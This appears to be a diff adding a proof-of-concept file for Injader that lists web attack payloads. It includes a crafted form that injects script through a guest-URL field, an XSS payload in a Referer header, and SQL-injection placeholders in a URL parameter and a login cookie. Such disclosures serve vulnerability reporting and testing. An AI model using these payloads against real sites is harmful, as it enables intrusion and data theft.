@@ -1,0 +1,24 @@
+HTML-injection:
+
+&lt;form action=&quot;http://injader/comment.php?action=create&amp;area=1&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;txtGuestName&quot; value=&quot;test&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;txtGuestEmail&quot; value=&quot;test@mail.com&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;chkPreview&quot; value=&quot;on&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;txtContent&quot; value=&quot;test&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;txtArticleID&quot; value=&quot;1&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;txtGuestURL&quot; value=&#039;http://www.example.com&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;&#039;/&gt;
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; name=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+
+Cross-site scripting:
+
+GET /login.php HTTP/1.1
+Referer: &quot;&gt;&lt;script&gt;alert(&#039;XSS&#039;);&lt;/script&gt;
+
+SQL-injection:
+
+http://www.example.com/search.php?go=yes&amp;q=a&amp;area1=123%27SQL_CODE
+
+GET /index.php HTTP/1.1
+Cookie: IJ-Login=123&#039;SQL_CODE_HERE
+
